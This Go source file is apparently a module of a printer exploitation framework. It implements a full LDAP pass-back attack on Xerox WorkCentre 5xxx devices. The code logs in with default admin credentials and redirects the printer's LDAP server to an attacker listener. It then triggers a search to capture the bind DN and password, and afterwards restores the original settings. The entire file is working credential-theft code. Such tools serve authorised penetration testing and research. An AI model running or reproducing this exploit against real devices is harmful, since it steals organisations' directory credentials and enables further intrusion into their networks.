package safe

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"time"

	"papercut/internal/listener"
	"papercut/internal/modules"
	"papercut/internal/output"
)

func init() { register(func() modules.ExploitModule { return NewXeroxWorkcentreLDAP() }) }

// XeroxWorkcentreLDAP implements the Xerox WorkCentre 5xxx LDAP pass-back attack.
// Authenticates with default credentials (admin/1111), extracts the current LDAP
// server configuration, replaces it with the attacker's listener address, triggers
// an LDAP search, captures the LDAP bind credentials, and restores the original config.
//
// Based on Metasploit auxiliary/gather/xerox_workcentre_5xxx_ldap by Deral Heiland
// and Pete Arzamendi.
//
// Category: SAFE — restores original LDAP config after credential capture.
type XeroxWorkcentreLDAP struct {
	modules.BaseModule
}

// NewXeroxWorkcentreLDAP creates a new instance of the Xerox WorkCentre LDAP pass-back module.
func NewXeroxWorkcentreLDAP() *XeroxWorkcentreLDAP {
	m := &XeroxWorkcentreLDAP{
		BaseModule: modules.BaseModule{
			Mod: modules.Module{
				Name:         "xerox/ldap/workcentre_passback",
				Description:  "Xerox WorkCentre 5xxx LDAP Pass-Back — extracts LDAP credentials via config redirect",
				Manufacturer: "Xerox",
				Category:     "SAFE",
				Authors:      []string{"Waffl3ss", "Deral Heiland", "Pete Arzamendi"},
				Tags:         []string{"xerox", "workcentre", "ldap", "passback", "credentials", "mfp"},
				Models:       []string{"WorkCentre 5735", "WorkCentre 5740", "WorkCentre 5745", "WorkCentre 5755"},
			},
			Opts: []*modules.Option{
				{Name: "RHOST", Default: "", Required: true, Description: "Target IP address"},
				{Name: "RPORT", Default: "80", Required: false, Description: "Target HTTP port"},
				{Name: "LHOST", Default: "", Required: true, Description: "Listener IP for LDAP capture"},
				{Name: "LPORT", Default: "389", Required: false, Description: "Listener port for LDAP capture"},
				{Name: "USERNAME", Default: "admin", Required: false, Description: "Web admin username"},
				{Name: "PASSWORD", Default: "1111", Required: false, Description: "Web admin password"},
				{Name: "SSL", Default: "false", Required: false, Description: "Use HTTPS instead of HTTP"},
				{Name: "VERBOSE", Default: "false", Required: false, Description: "Verbose output"},
				{Name: "TIMEOUT", Default: "60", Required: false, Description: "Callback timeout in seconds"},
				{Name: "PROXY", Default: "", Required: false, Description: "Proxy (socks5://host:port or http://host:port)"},
			},
		},
	}
	m.InitDefaults()
	return m
}

func (x *XeroxWorkcentreLDAP) newHTTPClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, fmt.Errorf("create cookie jar: %w", err)
	}
	return &http.Client{
		Jar:       jar,
		Timeout:   time.Duration(x.IntVal("TIMEOUT", 60)) * time.Second,
		Transport: modules.NewHTTPTransport(x.Val("PROXY")),
	}, nil
}

func (x *XeroxWorkcentreLDAP) baseURL() string {
	scheme := "http"
	if x.BoolVal("SSL") {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s:%s", scheme, x.Val("RHOST"), x.Val("RPORT"))
}

// Check verifies the target is a Xerox WorkCentre and default credentials work.
func (x *XeroxWorkcentreLDAP) Check() (*modules.CheckResult, error) {
	if err := x.Validate(); err != nil {
		return nil, err
	}

	rhost := x.Val("RHOST")
	portInt := x.IntVal("RPORT", 80)
	verbose := x.BoolVal("VERBOSE")

	client, err := x.newHTTPClient()
	if err != nil {
		return nil, err
	}

	// Step 1: Get auth cookie
	if verbose {
		output.Info("  Getting session cookie...")
	}
	err = x.getSessionCookie(client, verbose)
	if err != nil {
		return &modules.CheckResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Connection failed: %v", err),
		}, nil
	}

	// Step 2: Login
	err = x.login(client, verbose)
	if err != nil {
		return &modules.CheckResult{
			Success:  false, Target: rhost, Port: portInt,
			Username: x.Val("USERNAME"),
			Password: x.Val("PASSWORD"),
			Details:  fmt.Sprintf("Login failed: %v", err),
		}, nil
	}

	return &modules.CheckResult{
		Success:  true, Target: rhost, Port: portInt,
		Username: x.Val("USERNAME"),
		Password: x.Val("PASSWORD"),
		Details:  "Xerox WorkCentre — credentials accepted",
	}, nil
}

// Exploit performs the full LDAP pass-back attack.
func (x *XeroxWorkcentreLDAP) Exploit() (*modules.ExploitResult, error) {
	if err := x.Validate(); err != nil {
		return nil, err
	}

	rhost := x.Val("RHOST")
	portInt := x.IntVal("RPORT", 80)
	lhost := x.Val("LHOST")
	lport := x.Val("LPORT")
	verbose := x.BoolVal("VERBOSE")
	timeout := time.Duration(x.IntVal("TIMEOUT", 60)) * time.Second

	client, err := x.newHTTPClient()
	if err != nil {
		return nil, err
	}

	// Step 1: Get session cookie
	output.Info("Getting session cookie from %s...", x.baseURL())
	err = x.getSessionCookie(client, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Connection failed: %v", err),
		}, nil
	}

	// Step 2: Login
	output.Info("Authenticating as %s...", x.Val("USERNAME"))
	err = x.login(client, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Login failed: %v", err),
		}, nil
	}
	output.Success("Authentication successful")

	// Step 3: Extract current LDAP config
	output.Info("Extracting LDAP server configuration...")
	origServer, origPort, err := x.getLDAPConfig(client, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Failed to extract LDAP config: %v", err),
		}, nil
	}
	output.Success("Current LDAP server: %s:%s", origServer, origPort)

	// Step 4: Update LDAP server to attacker
	output.Info("Redirecting LDAP to %s:%s...", lhost, lport)
	err = x.updateLDAPServer(client, lhost, lport, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Failed to update LDAP config: %v", err),
		}, nil
	}

	if verbose {
		output.Success("  LDAP server updated to %s:%s", lhost, lport)
	}

	// Step 5: Start LDAP listener + trigger search
	listenAddr := fmt.Sprintf("%s:%s", lhost, lport)
	output.Info("Starting LDAP listener on %s...", listenAddr)

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	credsCh := make(chan *listener.LDAPCreds, 1)
	errCh := make(chan error, 1)

	go func() {
		creds, err := listener.ListenLDAP(ctx, listenAddr, timeout, verbose)
		if err != nil {
			errCh <- err
		} else {
			credsCh <- creds
		}
	}()

	// Give listener a moment to start
	time.Sleep(500 * time.Millisecond)

	// Trigger LDAP search
	output.Info("Triggering LDAP search...")
	if trigErr := x.triggerLDAPSearch(client, verbose); trigErr != nil {
		output.Warn("Trigger request failed: %v (continuing to wait...)", trigErr)
	}

	// Wait for credentials
	var creds *listener.LDAPCreds
	select {
	case creds = <-credsCh:
		// Got credentials
	case err := <-errCh:
		output.Error("Listener error: %v", err)
	case <-ctx.Done():
		output.Error("Timeout waiting for LDAP callback")
	}

	// Step 6: Restore original LDAP config (always)
	output.Info("Restoring original LDAP server %s:%s...", origServer, origPort)
	if restoreErr := x.restoreLDAPServer(client, origServer, origPort, verbose); restoreErr != nil {
		output.Warn("Failed to restore LDAP config: %v — please restore manually!", restoreErr)
	} else {
		output.Success("LDAP configuration restored")
	}

	if creds == nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: "LDAP pass-back failed — no credentials captured",
		}, nil
	}

	// Display results
	fmt.Println()
	output.Success("--- LDAP Credentials ---")
	output.Success("  Bind DN:  %s", creds.BindDN)
	output.Success("  Password: %s", creds.Password)
	fmt.Println()

	return &modules.ExploitResult{
		Success: true, Target: rhost, Port: portInt,
		Details: "LDAP credentials captured via pass-back",
		Data:    fmt.Sprintf("Username: %s\nPassword: %s", creds.BindDN, creds.Password),
	}, nil
}

// getSessionCookie fetches /header.php?tab=status to establish a session.
func (x *XeroxWorkcentreLDAP) getSessionCookie(client *http.Client, verbose bool) error {
	pageURL := x.baseURL() + "/header.php?tab=status"

	if verbose {
		output.Info("  GET %s", pageURL)
	}

	resp, err := client.Get(pageURL)
	if err != nil {
		return fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body) // drain

	if resp.StatusCode != 200 {
		return fmt.Errorf("HTTP %d — not a Xerox WorkCentre", resp.StatusCode)
	}

	if verbose {
		output.Success("  Session cookie acquired")
	}

	return nil
}

// login authenticates to the Xerox web interface and verifies success
// by checking that we can access a protected page afterward.
func (x *XeroxWorkcentreLDAP) login(client *http.Client, verbose bool) error {
	loginURL := x.baseURL() + "/userpost/xerox.set"

	data := url.Values{
		"_fun_function": {"HTTP_Authenticate_fn"},
		"NextPage":      {"%2Fproperties%2Fauthentication%2FluidLogin.php"},
		"webUsername":   {x.Val("USERNAME")},
		"webPassword":   {x.Val("PASSWORD")},
		"frmaltDomain":  {"default"},
	}

	if verbose {
		output.Info("  POST %s", loginURL)
	}

	resp, err := client.PostForm(loginURL, data)
	if err != nil {
		return fmt.Errorf("login request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("read login response: %w", err)
	}

	if resp.StatusCode != 200 {
		return fmt.Errorf("login failed (HTTP %d)", resp.StatusCode)
	}

	// Check response body for failure indicators — Xerox returns 200 even on bad creds
	bodyStr := string(body)
	if strings.Contains(bodyStr, "login failed") ||
		strings.Contains(bodyStr, "Login failed") ||
		strings.Contains(bodyStr, "incorrect") ||
		strings.Contains(bodyStr, "Invalid") {
		return fmt.Errorf("login failed — invalid credentials")
	}

	// Verify authentication by accessing the LDAP config page
	verifyURL := x.baseURL() + "/ldap/index.php?ldapindex=default&from=ldapConfig"
	if verbose {
		output.Info("  Verifying auth via %s", verifyURL)
	}

	vResp, err := client.Get(verifyURL)
	if err != nil {
		return fmt.Errorf("auth verification request failed: %w", err)
	}
	defer vResp.Body.Close()

	vBody, err := io.ReadAll(vResp.Body)
	if err != nil {
		return fmt.Errorf("read verification response: %w", err)
	}

	vStr := string(vBody)

	// If not authenticated, the printer redirects to login or returns a page without LDAP config JS vars
	if vResp.StatusCode == 401 || vResp.StatusCode == 403 {
		return fmt.Errorf("login failed — not authorized (HTTP %d)", vResp.StatusCode)
	}

	// The LDAP config page should contain JavaScript variables like ldapServerAddress
	if !strings.Contains(vStr, "ldapServer") && !strings.Contains(vStr, "LDAP") {
		if strings.Contains(vStr, "login") || strings.Contains(vStr, "Login") || strings.Contains(vStr, "password") {
			return fmt.Errorf("login failed — redirected back to login page")
		}
		return fmt.Errorf("login failed — could not access LDAP configuration page")
	}

	if verbose {
		output.Success("  Auth verified — LDAP config page accessible")
	}

	return nil
}

// getLDAPConfig extracts the current LDAP server IP and port from the config page.
func (x *XeroxWorkcentreLDAP) getLDAPConfig(client *http.Client, verbose bool) (string, string, error) {
	configURL := x.baseURL() + "/ldap/index.php?ldapindex=default&from=ldapConfig"

	if verbose {
		output.Info("  GET %s", configURL)
	}

	resp, err := client.Get(configURL)
	if err != nil {
		return "", "", fmt.Errorf("config request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", "", fmt.Errorf("read config: %w", err)
	}

	if resp.StatusCode != 200 {
		return "", "", fmt.Errorf("config page HTTP %d", resp.StatusCode)
	}

	bodyStr := string(body)

	// Extract IP octets from JS: valIpv4_1_N[2] = xxx
	reIP := regexp.MustCompile(`valIpv4_1_\d\[2\]\s*=\s*(\d+)`)
	ipMatches := reIP.FindAllStringSubmatch(bodyStr, -1)
	if len(ipMatches) < 4 {
		return "", "", fmt.Errorf("could not extract LDAP server IP from config page")
	}

	ldapServer := fmt.Sprintf("%s.%s.%s.%s",
		ipMatches[0][1], ipMatches[1][1], ipMatches[2][1], ipMatches[3][1])

	// Extract port from JS: valPrt_1[2] = xxx
	rePort := regexp.MustCompile(`valPrt_1\[2\]\s*=\s*(\d+)`)
	portMatch := rePort.FindStringSubmatch(bodyStr)
	ldapPort := "389"
	if portMatch != nil {
		ldapPort = portMatch[1]
	}

	return ldapServer, ldapPort, nil
}

// updateLDAPServer changes the LDAP server to the attacker's address.
func (x *XeroxWorkcentreLDAP) updateLDAPServer(client *http.Client, host, port string, verbose bool) error {
	updateURL := x.baseURL() + "/dummypost/xerox.set"

	data := url.Values{
		"_fun_function":              {"HTTP_Set_Config_Attrib_fn"},
		"NextPage":                   {"/ldap/index.php?ldapindex=default"},
		"from":                       {"ldapConfig"},
		"ldap.server[default].server": {fmt.Sprintf("%s:%s", host, port)},
		"ldap.maxSearchResults":       {"25"},
		"ldap.searchTime":             {"30"},
	}

	if verbose {
		output.Info("  POST %s (update LDAP to %s:%s)", updateURL, host, port)
	}

	resp, err := client.PostForm(updateURL, data)
	if err != nil {
		return fmt.Errorf("update request: %w", err)
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body) // drain

	if resp.StatusCode != 200 {
		return fmt.Errorf("update failed (HTTP %d)", resp.StatusCode)
	}

	return nil
}

// triggerLDAPSearch sends a search request that causes the printer to connect to LDAP.
func (x *XeroxWorkcentreLDAP) triggerLDAPSearch(client *http.Client, verbose bool) error {
	triggerURL := x.baseURL() + "/userpost/xerox.set"

	data := url.Values{
		"_fun_function":  {"HTTP_LDAP_Search_fn"},
		"NextPage":       {"%2Fldap%2Fmappings.php%3Fldapindex%3Ddefault%26from%3DldapConfig"},
		"ldapSearchName": {"test"},
		"ldapServerIndex": {"default"},
		"nameSchema":     {"givenName"},
		"emailSchema":    {"mail"},
		"phoneSchema":    {"telephoneNumber"},
		"postalSchema":   {"postalAddress"},
		"mailstopSchema": {"l"},
		"citySchema":     {"physicalDeliveryOfficeName"},
		"stateSchema":    {"st"},
		"zipCodeSchema":  {"postalcode"},
		"countrySchema":  {"co"},
		"faxSchema":      {"facsimileTelephoneNumber"},
		"homeSchema":     {"homeDirectory"},
		"memberSchema":   {"memberOf"},
		"uidSchema":      {"uid"},
	}

	if verbose {
		output.Info("  POST %s (trigger LDAP search)", triggerURL)
	}

	resp, err := client.PostForm(triggerURL, data)
	if err != nil {
		return fmt.Errorf("trigger request: %w", err)
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body) // drain

	return nil
}

// restoreLDAPServer restores the original LDAP config.
func (x *XeroxWorkcentreLDAP) restoreLDAPServer(client *http.Client, host, port string, verbose bool) error {
	restoreURL := x.baseURL() + "/dummypost/xerox.set"

	data := url.Values{
		"_fun_function":              {"HTTP_Set_Config_Attrib_fn"},
		"NextPage":                   {"/ldap/index.php?ldapaction=add"},
		"ldapindex":                  {"default&from=ldapConfig"},
		"ldap.server[default].server": {fmt.Sprintf("%s:%s", host, port)},
		"ldap.maxSearchResults":       {"25"},
		"ldap.searchTime":             {"30"},
		"ldap.search.uid":             {"uid"},
		"ldap.search.name":            {"givenName"},
		"ldap.search.email":           {"mail"},
		"ldap.search.phone":           {"telephoneNumber"},
		"ldap.search.postal":          {"postalAddress"},
		"ldap.search.mailstop":        {"l"},
		"ldap.search.city":            {"physicalDeliveryOfficeName"},
		"ldap.search.state":           {"st"},
		"ldap.search.zipcode":         {"postalcode"},
		"ldap.search.country":         {"co"},
		"ldap.search.ifax":            {"No Mappings Available"},
		"ldap.search.faxNum":          {"facsimileTelephoneNumber"},
		"ldap.search.home":            {"homeDirectory"},
		"ldap.search.membership":      {"memberOf"},
	}

	if verbose {
		output.Info("  POST %s (restore LDAP to %s:%s)", restoreURL, host, port)
	}

	resp, err := client.PostForm(restoreURL, data)
	if err != nil {
		return fmt.Errorf("restore request: %w", err)
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body) // drain

	if resp.StatusCode != 200 {
		return fmt.Errorf("restore failed (HTTP %d)", resp.StatusCode)
	}

	return nil
}
